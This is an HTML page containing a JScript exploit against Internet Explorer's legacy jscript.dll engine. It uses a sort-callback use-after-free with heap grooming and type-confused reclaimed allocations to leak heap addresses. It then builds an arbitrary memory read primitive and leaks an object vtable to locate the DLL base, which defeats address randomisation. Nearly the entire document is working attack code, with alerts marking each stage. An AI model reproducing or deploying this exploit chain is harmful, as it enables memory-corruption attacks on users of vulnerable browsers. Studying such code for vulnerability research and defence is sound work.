<!DOCTYPE html>
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
<script language="JScript.Compact">

function CreateVar32(Type, ObjPtr, NextVar) {
   var Data = new Array(); // Every element of this array will be a WORD
   Data.push(Type, 0x00, 0x00, 0x00,
          ObjPtr & 0xFFFF, (ObjPtr >> 16) & 0xFFFF,
          NextVar & 0xFFFF, (NextVar >> 16) & 0xFFFF);
   return String.fromCharCode.apply(null, Data);
}
  
var UntrackedVarCount = 300;
var UntrackedVarSet;
var VarSpray;
var VarSprayCount = 20000; // 200 GcBlocks
var NameListAnchors;
var NameListAnchorCount = 20000;

var SortDepth = 0;
var SortArray = new Array(); // Array to be "sorted" by glitched method
// Setup - fills the sort array with arrays to be sorted. Done first to avoid the stack setup getting messed up.
for(i = 0; i < 310; i++) SortArray[i] = [0, 0];

function GlitchedSort(untracked_1, untracked_2) {
    untracked_1 = VarSpray[SortDepth*2];
    untracked_2 = VarSpray[SortDepth*2 + 1];
	
    if(SortDepth > (UntrackedVarCount / 2)) {
        VarSpray = new Array(); // Erase VarSpray
        CollectGarbage(); // Free the GcBlocks
        UntrackedVarSet.push(untracked_1);
        UntrackedVarSet.push(untracked_2);
        return 0;
    }
    
    SortDepth += 1;
    SortArray[SortDepth].sort(GlitchedSort);
    UntrackedVarSet.push(untracked_1);
    UntrackedVarSet.push(untracked_2);
    return 0;
}

function NewUntrackedVarSet(Count) {
	SortDepth = 0;
    VarSpray = new Array();
    NameListAnchors = new Array();
    UntrackedVarSet = new Array();
    for(i = 0; i < NameListAnchorCount; i++) NameListAnchors[i] = new Object(); // Overlay must happen before var spray
    for(i = 0; i < VarSprayCount; i++) VarSpray[i] = new Object();
    CollectGarbage();
    SortArray[0].sort(GlitchedSort); // Two untracked vars will be passed to this method by the JS engine
}

var AnchorObjectsBackup;
var LeakedAnchorIndex = -1;

function ReClaimNameList(AnchorIndex, Value, PropertyName) {
	CollectGarbage(); // Cleanup
	AnchorObjectsBackup[AnchorIndex] = null; // Delete the anchor associated with the leaked NameList allocation
	CollectGarbage(); // Free the leaked NameList
	AnchorObjectsBackup[AnchorIndex] = new Object();
	AnchorObjectsBackup[AnchorIndex][Array(379).join('A')] = 1; // 0x17a property name size for 0x648 NameList allocation size
	AnchorObjectsBackup[AnchorIndex]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
	AnchorObjectsBackup[AnchorIndex]["\u0003"] = 1;
	AnchorObjectsBackup[AnchorIndex][PropertyName] = Value; // The mutable variable
}

var MutableVar;

function LeakByte(Address) {
    ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return (MutableVar.length >> 15) & 0xff; // Shift to align and get the byte.
}

function LeakDword(Address) {
    ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 2, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x8, Address + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LowWord + (HighWord << 16);
}

function LeakObjectAddress(ObjVarAddress, ObjVarValue) {
	ReClaimNameList(LeakedAnchorIndex, ObjVarValue, CreateVar32(0x8, ObjVarAddress + 8 + 2, 0)); // Skip +8 over Type field of VAR to object pointer field and +2 for BSTR length adjustment
    LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(LeakedAnchorIndex, ObjVarValue, CreateVar32(0x8, ObjVarAddress + 8 + 4, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field) and +8 to skip over VAR Type
    HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LeakDword((LowWord + (HighWord << 16)) + 8); // The VAR at the start of the VVAL has an object pointer that points to yet another VAR: this second one will have the actual address of the object in its object pointer field
}

function Exploit() {
	var LFHBlocks = new Array();

	// Trigger LFH for a size of 0x648

	for(i = 0; i < 50; i++) {
        Temp = new Object();
        Temp[Array(379).join('A')] = 1; // Property name size of 0x17a (378) will produce an allocation of 0x648 bytes
        LFHBlocks.push(Temp);
    }
	
	// New set of untracked vars in freed GcBlock
	
	NewUntrackedVarSet(UntrackedVarCount);
	
	// Re-claim with type confusion NameLists
	
	for(i = 0; i < NameListAnchorCount; i++) {
		NameListAnchors[i][Array(379).join('A')] = 1; // 0x17a property name size for 0x648 NameList allocation size
		NameListAnchors[i]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
		NameListAnchors[i]["\u0003"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
		NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
	}
		
	// Leak final VVAL address from one of the NameLists
	
	AnchorObjectsBackup = NameListAnchors; // Prevent it from being freed and losing our leaked pointer
    
	var LeakedVvalAddress = 0;
	
    for(i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number" && UntrackedVarSet[i] > 0x1000) {
            LeakedVvalAddress = UntrackedVarSet[i];
			break;
        }
    }

	if(LeakedVvalAddress != 0) {
		alert("leaked final VVAL address of " + LeakedVvalAddress.toString(16));
	}
	else {
		alert("Failed to leak final VVAL address");
	}
	
	var PrimaryVvalPropName = "AA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

    for(i=0; i < 46; i++) {
        PrimaryVvalPropName += CreateVar32(0x80, LeakedVvalAddress, 0);
    }
	
	while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a

	// New set of untracked vars in freed GcBlock
	
	NewUntrackedVarSet(UntrackedVarCount);
	
	// Re-claim with leaked VVAL address vars (to be dereferenced for anchor object index extraction)
	
	for(i = 0; i < NameListAnchorCount; i++) {
		NameListAnchors[i][PrimaryVvalPropName] = 1;
	}
	
	// Extract NameList anchor index through untracked var dereference to leaked VVAL prefix VAR
	
	var LeakedVvalVar;

	for(i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number") {
            LeakedAnchorIndex = parseInt(UntrackedVarSet[i] + ""); // Attempting to access the untracked var without parseInt will fail ("null or not an object")
            LeakedVvalVar = UntrackedVarSet[i]; // The + "" trick alone does not seeem to be enough to populate this with the actual value
			break;
        }
    }
	
	alert("Leaked anchor object index: " + LeakedAnchorIndex.toString(16));
	
	// Verify that the VAR within the leaked VVAL can be influenced by directly freeing/re-claiming the NameList associated with the leaked NameList anchor object (whose index is now known)
	
	ReClaimNameList(LeakedAnchorIndex, 0x11, "A"); // Verify the authenticity of the underlying anchor object index behind NameList containing leaked VVAL address
	
	if(LeakedVvalVar + "" == 0x11) {
		alert("Leaked anchor object re-claim verification success");
	}
	else {
		alert("Leaked anchor object re-claim verification failed");
	}
	
	// Create the mutable variable which will be used throughout the remainder of the exploit
	
	ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x3, 0x22, 0));
	
	var PrimaryVvalPropName = "AA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

    for(i=0; i < 46; i++) {
        PrimaryVvalPropName += CreateVar32(0x80, LeakedVvalAddress + 0x30, 0); // +0x30 is the offset to property name field of 32-bit VVAL struct
    }
	
	while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a
	
	// New set of untracked vars in freed GcBlock
	
	NewUntrackedVarSet(UntrackedVarCount);
	
	// Re-claim with leaked VVAL name property address vars (this is the memory address of the mutable variable that will be created)
	
	for(i = 0; i < NameListAnchorCount; i++) {
		NameListAnchors[i][PrimaryVvalPropName] = 1;
	}

	for(i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number") {
            if(UntrackedVarSet[i] + "" == 0x22) {
				MutableVar = UntrackedVarSet[i];
				break;
			}
        }
    }
	
	// Verify the mutable var can be changed via simple re-claim
	
	
	ReClaimNameList(LeakedAnchorIndex, 0, CreateVar32(0x3, 0x33, 0));
	
	if(MutableVar + "" == 0x33) {
		alert("Verified mutable variable modification via re-claim");
	}
	else {
		alert("Failed to verify mutable variable modification via re-claim");
	}
	
	// Test arbitrary read primitive
	
	if(LeakByte(LeakedVvalAddress + 0x30) == 0x8) { // Change mutable var to a BSTR pointing at itself.
		alert("Memory leak test successful");
	}
	else {
		alert("Memory leak test failed");
	}
	
	// Derive jscript.dll base from leaked Object vtable
	
	var Obj = new Object();
	var ObjectAddress = LeakObjectAddress(LeakedVvalAddress, Obj);
	
	alert("Leaked object address: " + ObjectAddress.toString(16));
	
	var VtableAddress = LeakDword(ObjectAddress);
	
	alert("Leaked vtable address: " + VtableAddress.toString(16));
}

Exploit();

</script>
</head>
</html>